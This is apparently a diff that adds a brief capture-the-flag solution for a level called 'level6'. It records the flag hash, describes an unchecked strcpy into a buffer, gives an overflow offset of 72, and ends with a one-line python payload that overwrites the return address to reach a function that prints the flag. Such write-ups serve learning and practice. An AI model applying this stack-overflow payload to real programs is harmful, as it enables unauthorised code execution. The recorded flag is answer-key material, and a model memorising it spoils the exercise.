@@ -1,0 +1,7 @@
+flag: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+just a buffer overflow:
+This level takes an argument and strcpy it to a buffer, not checking the size. The decompilation shows that we got 2 functions: m that prints nope and n that cat the flag.
+Using a buffer overflow pattern generator gives us the offset of the buffer overflow: 72
+
+./level6 $(python -c 'print "A"*72+"\x54\x84\x04\x08"')
